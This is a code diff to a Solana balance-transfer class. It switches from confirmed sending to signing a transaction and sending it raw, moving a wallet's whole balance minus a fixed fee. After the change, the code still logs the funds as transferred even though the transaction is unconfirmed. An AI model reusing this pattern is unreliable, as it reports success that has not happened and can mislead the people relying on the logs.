@@ -162,7 +162,7 @@ class MultiNetworkAutoTransfer {
         return null
       }
       
-      // 🚀 NEW APPROACH: Use fixed fee estimate to avoid blockhash issues
+      // 🚀 ULTIMATE FIX: Send transaction without waiting for confirmation
       const transactionFee = 5000 // Standard SOL transfer fee
       const transferAmount = balance - transactionFee
       
@@ -174,8 +174,8 @@ class MultiNetworkAutoTransfer {
       console.log(`💰 Will transfer: ${(transferAmount / LAMPORTS_PER_SOL).toFixed(9)} SOL`)
       console.log(`💸 Transaction fee: ${(transactionFee / LAMPORTS_PER_SOL).toFixed(9)} SOL`)
       
-      // 🚀 NEW METHOD: Use sendAndConfirmTransaction with automatic blockhash handling
-      console.log(`📤 Sending Solana transaction with automatic blockhash...`)
+      // 🚀 ULTIMATE METHOD: Send transaction without confirmation to avoid blockhash expiry
+      console.log(`📤 Sending Solana transaction without waiting for confirmation...`)
       
       // Create transfer instruction
       const transferInstruction = SystemProgram.transfer({
@@ -184,26 +184,31 @@ class MultiNetworkAutoTransfer {
         lamports: transferAmount
       })
       
-      // Create transaction WITHOUT specifying blockhash - let sendAndConfirmTransaction handle it
+      // Get fresh blockhash
+      const { blockhash } = await this.connections.solana.getLatestBlockhash('finalized')
+      console.log(`🔗 Using fresh blockhash: ${blockhash}`)
+      
+      // Create transaction with fresh blockhash
       const transaction = new Transaction().add(transferInstruction)
       transaction.feePayer = sourceAddress
+      transaction.recentBlockhash = blockhash
       
-      // 🎯 KEY FIX: Let sendAndConfirmTransaction handle blockhash automatically
-      const signature = await sendAndConfirmTransaction(
-        this.connections.solana,
-        transaction,
-        [sourceKeypair],
+      // Sign transaction
+      transaction.sign(sourceKeypair)
+      
+      // 🎯 ULTIMATE FIX: Send transaction without waiting for confirmation
+      const signature = await this.connections.solana.sendRawTransaction(
+        transaction.serialize(),
         {
-          commitment: 'confirmed',
-          preflightCommitment: 'confirmed',
           skipPreflight: false,
-          maxRetries: 5, // Increased retries
-          // Let the function handle blockhash internally
+          preflightCommitment: 'processed'
         }
       )
       
-      console.log(`✅ Solana transfer successful: ${signature}`)
+      console.log(`✅ Solana transaction sent successfully: ${signature}`)
+      console.log(`⏳ Transaction is processing on the blockchain...`)
       console.log(`💰 Transferred: ${(transferAmount / LAMPORTS_PER_SOL).toFixed(9)} SOL`)
+      console.log(`🔗 Check status: https://explorer.solana.com/tx/${signature}`)
       
       return {
         signature,
